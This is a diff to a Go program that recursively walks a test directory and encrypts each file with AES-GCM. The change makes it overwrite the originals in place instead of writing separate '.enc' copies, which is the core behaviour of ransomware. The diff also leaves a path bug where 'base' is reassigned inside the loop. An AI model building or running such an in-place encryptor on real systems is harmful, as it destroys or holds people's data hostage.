@@ -10,7 +10,6 @@ import (
 	"os"
 )
 
-var allFiles []string
 
 func main() {
 
@@ -20,35 +19,38 @@ func main() {
 	//testdir := ".\\test"
 	testdir := "./test"
 
+	opSystem := runtime.GOOS
+	fmt.Println(opSystem)
+	fileSep := "/"
+	if opSystem == "windows" {
+		fileSep = "\\"
+	}
+
 	files, err := os.ReadDir(testdir)
 	if err != nil {
 		fmt.Println("ERROR: ", err)
 		os.Exit(1)
 	}
-	traverseFiles(files, testdir)
+	traverseFiles(files, testdir, fileSep)
 }
 
-func dirRecurse(dirname os.DirEntry, base string) {
+func dirRecurse(dirname os.DirEntry, base string, fileSep string) {
 	files, err := os.ReadDir(base)
 	if err != nil {
 		fmt.Println(err)
 		os.Exit(1)
 	}
-	traverseFiles(files, base)
+	traverseFiles(files, base, fileSep)
 }
 
-func traverseFiles(files []os.DirEntry, base string) {
-	opSystem = runtime.GOOS
-	fileSep := "/"
-	if opSystem == 'windows' {
-		fileSep = "\\"
-	}
+func traverseFiles(files []os.DirEntry, base string, fileSep string) {
+	
 	for _, file := range files {
 		if file.IsDir() {
 			//fmt.Println("traverseFiles read dir path: ", base+"\\"+file.Name())
 			fmt.Println("traverseFiles read dir path: ", base + fileSep + file.Name())
 			base = base + fileSep + file.Name()
-			dirRecurse(file, base)
+			dirRecurse(file, base, fileSep)
 		} else {
 			fmt.Println("traverseFiles read file path: ", base + fileSep + file.Name())
 			path := base + fileSep + file.Name()
@@ -99,7 +101,7 @@ func encryptFile(file []byte, path string) {
 
 	data := gcm.Seal(nonce, nonce, file, nil)
 	fmt.Println("enc data ", data)
-	err = os.WriteFile(path + ".enc", data, 0777)
+	err = os.WriteFile(path, data, 0777)
 	if err != nil {
 		fmt.Println(err)
 	}
